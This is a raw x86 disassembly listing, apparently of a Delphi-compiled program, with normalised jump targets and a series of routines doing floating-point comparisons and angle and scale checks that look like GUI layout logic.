pop ecx
pop ebx
pop ecx
pop ebp
retn
push ebp
call sub_467160
pop ecx
sub_467a08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x90 ]
mov ebx [ esi + 0x288 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ eax + 0x70 ]
mov eax [ ebx + 0x10 ]
call sub_41d618
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41d734
cmp [ esi + 0x270 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4679ec
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x5c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x18 ] 0xffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ esi + 0x29a ]
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x8 ]
call sub_41ce24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx edi
call sub_4665a8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_4665a8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467b2c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467c53
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467c5a
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f0c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_414098
mov ebx eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46bb74
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_403f3c
jmp r-xdata
dec al
je r-xdata
mov esi [ ebx + 0x68 ]
cmp [ esi + 0x30a ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x60 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_403f3c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl [ eax + 0x8e ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46ac3c
mov eax [ ebp - 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_414098
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ esi + 0x30c ]
call [ esi + 0x308 ]
sub_467c64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46da00
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x88 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_46da00
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_413eec
sub_467cec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xffffffff
mov [ esi ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
cmp [ esi ] 0xffffffff
je r-xdata
mov eax [ ebx + 0x4c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x5c ]
mov [ esi ] eax
mov eax [ esi ]
cmp eax [ ebx + 0x5c ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_414098
mov ebx eax
mov eax ebx
call sub_46ace8
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
jne r-xdata
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
sub_467d78
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_467f9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push eax
call sub_467c64
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_467cec
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_403198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467fa4
lea eax [ ebp - 0x10 ]
call sub_403ee8
retn
mov [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x8e ]
mov [ ebp - 0x25 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x44 ]
sub eax 0x5a
je r-xdata
mov al [ ebp - 0x25 ]
xor al 0x1
mov [ ebp - 0x25 ] al
sub eax 0xb4
jne r-xdata
inc ebx
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
sub ebx esi
jl r-xdata
inc esi
dec ebx
jne r-xdata
fld [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fcomp [ eax + 0xb8 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_467b2c
pop ecx
test al al
je r-xdata
fld [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
ja r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_466b88
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax edi
call sub_4679ec
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ eax + 0x288 ]
mov [ ebp - 0x2c ] edx
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_461614
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
call sub_45c9c4
imul [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_467a08
pop ecx
mov [ ebp - 0x1c ] edi
mov eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
cmp [ ebp - 0x1c ] 0xffffffff
je r-xdata
mov [ ebp - 0x20 ] eax
adc eax 0x0
fild [ ebp - 0x24 ]
fld [ r-xdata ]
fmulp st1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fild [ eax + 0x50 ]
fmulp st1
call sub_40299c
add [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov [ ebp - 0x24 ] eax
cmp edi [ ebp - 0x1c ]
jl r-xdata
adc eax 0x0
mov eax [ ebp - 0x24 ]
add eax edi
mov edx [ ebp - 0x1c ]
sub edx [ ebp - 0x20 ]
cmp eax edx
setle al
mov eax edi
sub eax [ ebp - 0x24 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x20 ]
cmp eax edx
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_467a08
pop ecx
mov [ ebp - 0x1c ] edi
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
test al al
je r-xdata
sub_467fb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_468097
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push [ eax - 0x1c ]
push [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_466b88
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0xd4 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4679ec
pop ecx
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0xd8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax - 0x1c ]
push [ eax - 0x20 ]
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_465a80
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_467a08
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46809e
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
push [ eax - 0x24 ]
push [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_464d78
sub_4680a4
push ebp
mov ebp esp
mov ecx eax
cdq
fld1
xor eax edx
sub eax edx
je r-xdata
fwait
pop ebp
retn 0xc
fld [ ebp + 0x8 ]
jmp r-xdata
shr eax 0x1
jae r-xdata
fmul st0
fmul st1
jne r-xdata
fstp st0
cmp ecx 0x0
jge r-xdata
fld1
fdivrp st1
sub_4680ec
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov esi [ ebp + 0x8 ]
add esi 0xffffffe0
mov eax [ ebx ]
fld [ eax + 0xb8 ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx ]
fld [ eax + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ ebx ]
fild [ eax + 0x24 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebx ]
fild [ eax + 0x24 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebx ]
fld [ eax + 0xb8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
call sub_4680d4
call sub_402990
call sub_4680a4
fstp [ esi ]
fwait
jmp r-xdata
mov eax [ ebx ]
fld [ eax + 0xb8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ esi ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ ebx ]
mov [ eax + 0xb8 ] 0xd9d7bdbb
mov [ eax + 0xbc ] 0x3ddb7cdf
mov eax [ ebx ]
mov [ eax + 0xb8 ] 0x9999999a
mov [ eax + 0xbc ] 0x3fb99999
jmp r-xdata
fld [ esi ]
mov eax [ ebx ]
fcomp [ eax + 0xb8 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ ebx ]
mov edx [ eax + 0xb8 ]
mov [ esi ] edx
mov edx [ eax + 0xbc ]
mov [ esi + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
fild [ eax + 0x24 ]
fmul [ esi ]
fstp [ esi ]
fwait
mov eax [ ebp + 0x8 ]
push eax
xor eax eax
call sub_467fb8
pop ecx
sub_4681f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov esi [ ebp + 0x8 ]
add esi 0xffffffe0
mov eax [ ebx ]
fld [ eax + 0xb0 ]
mov eax [ ebp + 0x8 ]
fdiv [ eax - 0x28 ]
fstp [ esi ]
fwait
mov eax [ ebx ]
fld [ eax + 0xc0 ]
mov eax [ ebp + 0x8 ]
fdiv [ eax - 0x28 ]
fabs
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
mov eax [ ebx ]
fld [ eax + 0xb8 ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0xb0 ]
mov [ esi ] edx
mov edx [ eax + 0xb4 ]
mov [ esi + 0x4 ] edx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x69 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x19
je r-xdata
fld [ esi ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
ja r-xdata
fld [ esi ]
call sub_40299c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
fild [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
fmul [ eax - 0x28 ]
fstp [ esi ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0xe
jb r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x24 ]
push [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov ecx esi
mov eax [ ebx ]
xor edx edx
call sub_464d78
fld [ r-xdata ]
mov eax [ ebx ]
fsubr [ eax + 0xb8 ]
fld [ r-xdata ]
fdivp st1
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebx ]
push [ eax + 0xb4 ]
push [ eax + 0xb0 ]
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
call sub_4623e4
fstp [ esi ]
fwait
jmp r-xdata
fld [ esi ]
fcomp [ ebp - 0x8 ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov al 0x1
call sub_467fb8
pop ecx
sub_46834c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4681f8
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4680ec
pop ecx
pop ebp
retn
sub_46838c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0xb8 ]
mov [ eax - 0x20 ] ecx
mov ecx [ edx + 0xbc ]
mov [ eax - 0x1c ] ecx
mov [ ebp - 0x1 ] 0x1
xor esi esi
xor ebx ebx
fld [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fsubr [ eax + 0xb8 ]
mov eax [ ebp + 0x8 ]
fcomp [ eax - 0x20 ]
fnstsw ax
sahf
ja r-xdata
test esi esi
jne r-xdata
xor ebx ebx
jmp r-xdata
fld [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fadd [ eax + 0xb0 ]
mov eax [ ebp + 0x8 ]
fcomp [ eax - 0x20 ]
fnstsw ax
sahf
jae r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_46834c
pop ecx
jmp r-xdata
test bl bl
je r-xdata
mov bl 0x1
inc esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
xor eax eax
call sub_467fb8
pop ecx
cmp esi 0x7d0
jg r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x90 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov ecx esi
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_468470
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov ebx [ eax + 0x90 ]
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx [ eax + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x10 ]
mov edx [ ebx + 0x70 ]
call sub_41d618
mov eax [ ebx + 0x288 ]
mov eax [ eax + 0x10 ]
mov dl 0x1
call sub_41d734
mov eax [ esi ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x38 ]
mov eax [ esi ]
mov ecx [ ebx + 0x29a ]
call sub_46650c
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0xcc ]
mov eax [ esi ]
mov edx [ eax + 0x38 ]
mov eax [ esi ]
call sub_46650c
mov eax [ esi ]
mov ecx [ eax + 0x38 ]
mov eax [ esi ]
mov edx [ eax + 0xcc ]
mov eax [ esi ]
call sub_46650c
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_468510
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_468638
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x2e8 ]
call sub_46cf30
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46863f
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb8 ]
call sub_40299c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb0 ]
call sub_40299c
mov esi eax
sub esi ebx
jl r-xdata
inc esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4679ec
pop ecx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x90 ]
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax edi
call sub_46d844
cmp [ edi + 0x30a ] 0x0
je r-xdata
mov [ ebp - 0xc ] ebx
fild [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fsubr [ eax + 0xb0 ]
fsub [ r-xdata ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_466a3c
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467a08
pop ecx
push ebx
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
xor ecx ecx
mov eax [ edi + 0x30c ]
call [ edi + 0x308 ]
sub_46864c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_468840
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi ]
mov esi [ eax + 0x90 ]
mov eax [ edi ]
call sub_464db4
mov edx [ edi ]
mov [ edx + 0xc8 ] al
mov eax [ edi ]
mov edx [ eax + 0x48 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ edi ]
call sub_465660
fstp [ ebp - 0x28 ]
fwait
test bl bl
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x30 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
lea edx [ esi + 0x28e ]
mov eax [ edi ]
call sub_466f10
mov edx eax
lea ecx [ esi + 0x28e ]
mov eax [ edi ]
call sub_466e94
mov edx [ edi ]
mov [ edx + 0x2c ] eax
mov eax [ edi ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
push ebp
call sub_468470
pop ecx
mov [ ebp - 0x29 ] 0x19
mov eax [ edi ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ edi ]
fld [ eax + 0xb0 ]
mov eax [ edi ]
fcomp [ eax + 0xb8 ]
fnstsw ax
sahf
jb r-xdata
cmp [ ebp - 0x29 ] 0x12
jb r-xdata
mov eax [ edi ]
fld [ eax + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
je r-xdata
push ebp
call sub_46793c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468824
push 0x0
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f18
add esp 0x4
retn
mov eax [ edi ]
call sub_465b74
mov [ ebp - 0x11 ] al
mov al [ ebp - 0x11 ]
sub al 0x2
je r-xdata
cmp [ ebp - 0x29 ] 0x18
ja r-xdata
mov eax [ edi ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_460c9c
mov [ ebp - 0x29 ] al
cmp [ ebp - 0x29 ] 0x19
je r-xdata
cmp [ esi + 0x312 ] 0x0
je r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x7d0
lea eax [ ebp - 0xc ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404f18
add esp 0x4
xor eax eax
push ebp
push sub_46881d
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp - 0x28 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
jmp r-xdata
push ebp
call sub_46834c
pop ecx
jmp r-xdata
push ebp
call sub_46838c
pop ecx
jmp r-xdata
push ebp
call sub_467d78
pop ecx
jmp r-xdata
dec al
je r-xdata
fld [ ebp - 0x28 ]
xor eax eax
mov al [ ebp - 0x29 ]
mov edx [ rw-data ]
fcomp [ edx + eax * 8 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ edi ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x29 ] 0x18
jne r-xdata
push ebp
call sub_467d78
pop ecx
push ebp
call sub_468510
pop ecx
jmp r-xdata
inc [ ebp - 0x29 ]
jmp r-xdata
sub_468854
push ebx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
xor eax eax
call sub_41d434
jmp r-xdata
mov edx [ ebx + 0x78 ]
cmp [ edx + 0x21 ] 0x0
je r-xdata
add eax [ ebx + 0x88 ]
mov edx [ ebx + 0x7c ]
cmp [ edx + 0x21 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x74 ]
call sub_460384
sub_4688b8
push ebp
mov ebp esp
add esp 0xfffffff4
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ esi + 0x90 ]
mov eax [ edi + 0x288 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xdc ]
cmp [ esi + 0x8e ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x5a
je r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
call sub_45c9c4
jmp r-xdata
sub eax 0xb4
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_45c9c4
jmp r-xdata
sub eax 0xb3
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edi + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax esi
call sub_465e4c
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edi + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
jmp r-xdata
mov eax esi
call sub_465e4c
jmp r-xdata
sub_468970
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8e ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8f ] 0x0
je r-xdata
